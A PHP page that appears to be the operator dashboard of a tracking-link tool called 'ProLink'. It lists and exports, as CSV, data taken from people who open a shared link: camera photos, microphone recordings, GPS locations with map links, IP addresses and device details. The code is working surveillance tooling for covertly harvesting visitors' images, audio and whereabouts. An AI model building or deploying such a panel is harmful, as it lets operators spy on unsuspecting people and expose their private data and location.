<?php
$link_id = $_GET['id'] ?? null;
if (!$link_id) { header("Location: ?page=dashboard"); exit; }

$user = getCurrentUser();
$stmt = $pdo->prepare("SELECT * FROM links WHERE id = ? AND user_id = ?");
$stmt->execute([$link_id, $user['id']]);
$link = $stmt->fetch();
if (!$link) { header("Location: ?page=dashboard"); exit; }

$data = getCapturedData($link_id);

// Handle CSV Export
if (isset($_GET['export']) && $_GET['export'] === 'csv') {
    header('Content-Type: text/csv');
    header('Content-Disposition: attachment; filename="prolink_data_' . $link_id . '.csv"');
    $output = fopen('php://output', 'w');
    fputcsv($output, ['ID', 'Type', 'Content', 'IP Address', 'User Agent', 'Latitude', 'Longitude', 'Time']);
    foreach ($data as $row) {
        fputcsv($output, [$row['id'], $row['data_type'], $row['data_content'], $row['ip_address'], $row['user_agent'], $row['latitude'], $row['longitude'], $row['captured_at']]);
    }
    fclose($output);
    exit;
}
?>

<div class="space-y-8 animate-in fade-in duration-500">
    <!-- Header -->
    <div class="flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
            <div class="flex items-center gap-2 text-indigo-600 font-bold text-xs uppercase tracking-widest mb-2">
                <a href="?page=dashboard" class="hover:underline">Dashboard</a>
                <i class="fas fa-chevron-right text-[8px]"></i>
                <span>Intelligence Report</span>
            </div>
            <h1 class="text-4xl font-extrabold text-slate-900"><?= htmlspecialchars($link['title']) ?></h1>
            <p class="text-slate-500 font-medium mt-2">Detailed intelligence gathered from your power link.</p>
        </div>
        <div class="flex items-center gap-3 flex-wrap">
            <a href="?page=view&id=<?= $link_id ?>&export=csv" class="bg-emerald-600 text-white px-6 py-3 rounded-2xl font-bold shadow-lg shadow-emerald-200 hover:bg-emerald-700 transition-all flex items-center gap-2">
                <i class="fas fa-file-csv"></i>
                Export CSV
            </a>
        </div>
    </div>

    <!-- Stats Cards -->
    <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
        <div class="bg-white p-6 rounded-2xl border border-slate-100 shadow-sm">
            <p class="text-sm font-bold text-slate-500 uppercase mb-2">Total Captures</p>
            <p class="text-3xl font-extrabold text-slate-900"><?= count($data) ?></p>
        </div>
        <div class="bg-white p-6 rounded-2xl border border-slate-100 shadow-sm">
            <p class="text-sm font-bold text-slate-500 uppercase mb-2">Camera Captures</p>
            <p class="text-3xl font-extrabold text-slate-900"><?= count(array_filter($data, fn($d) => $d['data_type'] === 'camera')) ?></p>
        </div>
        <div class="bg-white p-6 rounded-2xl border border-slate-100 shadow-sm">
            <p class="text-sm font-bold text-slate-500 uppercase mb-2">Audio Records</p>
            <p class="text-3xl font-extrabold text-slate-900"><?= count(array_filter($data, fn($d) => $d['data_type'] === 'microphone')) ?></p>
        </div>
        <div class="bg-white p-6 rounded-2xl border border-slate-100 shadow-sm">
            <p class="text-sm font-bold text-slate-500 uppercase mb-2">Locations</p>
            <p class="text-3xl font-extrabold text-slate-900"><?= count(array_filter($data, fn($d) => $d['data_type'] === 'location')) ?></p>
        </div>
    </div>

    <!-- Data Grid -->
    <div class="space-y-6">
        <?php if (empty($data)): ?>
            <div class="bg-white rounded-[2.5rem] border-2 border-dashed border-slate-200 p-20 text-center">
                <div class="w-24 h-24 bg-slate-50 text-slate-300 rounded-full flex items-center justify-center mx-auto mb-6 text-4xl">
                    <i class="fas fa-database"></i>
                </div>
                <h3 class="text-xl font-extrabold text-slate-900 mb-2">No intelligence gathered yet</h3>
                <p class="text-slate-500 max-w-sm mx-auto font-medium">Once someone visits your link, their data will appear here in real-time.</p>
            </div>
        <?php else: ?>
            <?php foreach ($data as $row): ?>
                <div class="bg-white rounded-3xl border border-slate-100 shadow-sm hover:shadow-md transition-all overflow-hidden group">
                    <div class="p-6">
                        <div class="flex flex-col md:flex-row justify-between items-start gap-4 mb-6">
                            <div class="flex items-center gap-4">
                                <div class="w-14 h-14 rounded-2xl bg-indigo-50 text-indigo-600 flex items-center justify-center text-xl font-bold">
                                    <?php
                                    $icon = 'info-circle';
                                    if($row['data_type'] == 'camera') $icon = 'camera';
                                    elseif($row['data_type'] == 'microphone') $icon = 'microphone';
                                    elseif($row['data_type'] == 'location') $icon = 'location-dot';
                                    elseif($row['data_type'] == 'device_intel') $icon = 'microchip';
                                    ?>
                                    <i class="fas fa-<?= $icon ?>"></i>
                                </div>
                                <div>
                                    <h3 class="font-extrabold text-slate-900 uppercase tracking-tight text-lg"><?= htmlspecialchars($row['data_type']) ?></h3>
                                    <p class="text-xs font-bold text-slate-400 uppercase tracking-tighter">
                                        <i class="fas fa-clock mr-1"></i>
                                        <?= date('H:i:s, d M Y', strtotime($row['captured_at'])) ?>
                                    </p>
                                </div>
                            </div>
                            <div class="flex flex-wrap gap-2">
                                <span class="px-3 py-1 bg-slate-100 text-slate-600 text-[10px] font-extrabold rounded-full uppercase">IP: <?= htmlspecialchars($row['ip_address']) ?></span>
                                <?php if($row['latitude']): ?>
                                    <a href="https://www.google.com/maps?q=<?= $row['latitude'] ?>,<?= $row['longitude'] ?>" target="_blank" class="px-3 py-1 bg-blue-50 text-blue-600 text-[10px] font-extrabold rounded-full uppercase hover:bg-blue-600 hover:text-white transition-all">
                                        <i class="fas fa-map-marker-alt mr-1"></i> View Map
                                    </a>
                                <?php endif; ?>
                                <?php if($row['file_path']): ?>
                                    <a href="<?= htmlspecialchars($row['file_path']) ?>" download class="px-3 py-1 bg-indigo-50 text-indigo-600 text-[10px] font-extrabold rounded-full uppercase hover:bg-indigo-600 hover:text-white transition-all">
                                        <i class="fas fa-download mr-1"></i> Download
                                    </a>
                                <?php endif; ?>
                            </div>
                        </div>

                        <div class="bg-gradient-to-br from-slate-50 to-slate-100 rounded-2xl p-6 border border-slate-100">
                            <?php if($row['data_type'] == 'camera'): ?>
                                <div class="relative group max-w-md mx-auto">
                                    <img src="<?= htmlspecialchars($row['file_path']) ?>" class="w-full rounded-2xl shadow-lg border-4 border-white hover:scale-105 transition-transform">
                                    <a href="<?= htmlspecialchars($row['file_path']) ?>" download class="absolute bottom-4 right-4 bg-indigo-600 text-white w-10 h-10 rounded-full flex items-center justify-center shadow-xl opacity-0 group-hover:opacity-100 transition-all hover:scale-110">
                                        <i class="fas fa-download"></i>
                                    </a>
                                </div>
                            <?php elseif($row['data_type'] == 'microphone'): ?>
                                <div class="max-w-md mx-auto flex items-center gap-4">
                                    <audio controls class="flex-1 rounded-xl">
                                        <source src="<?= htmlspecialchars($row['file_path']) ?>" type="audio/webm">
                                    </audio>
                                    <a href="<?= htmlspecialchars($row['file_path']) ?>" download class="w-12 h-12 bg-white text-indigo-600 rounded-xl flex items-center justify-center shadow-sm border border-slate-200 hover:bg-indigo-600 hover:text-white transition-all">
                                        <i class="fas fa-download"></i>
                                    </a>
                                </div>
                            <?php elseif($row['data_type'] == 'device_intel' || $row['data_type'] == 'visit'): ?>
                                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                                    <?php 
                                    $details = json_decode($row['data_content'], true);
                                    if($details):
                                        foreach($details as $key => $val): 
                                            if(is_array($val)) $val = json_encode($val);
                                    ?>
                                        <div class="bg-white p-4 rounded-xl border border-slate-200 shadow-sm hover:shadow-md transition-all">
                                            <p class="text-[10px] font-bold text-slate-400 uppercase mb-2"><?= htmlspecialchars($key) ?></p>
                                            <p class="text-sm font-bold text-slate-900 truncate"><?= htmlspecialchars($val) ?></p>
                                        </div>
                                    <?php endforeach; endif; ?>
                                </div>
                            <?php else: ?>
                                <p class="text-sm font-medium text-slate-700 leading-relaxed"><?= nl2br(htmlspecialchars($row['data_content'])) ?></p>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>
            <?php endforeach; ?>
        <?php endif; ?>
    </div>
</div>
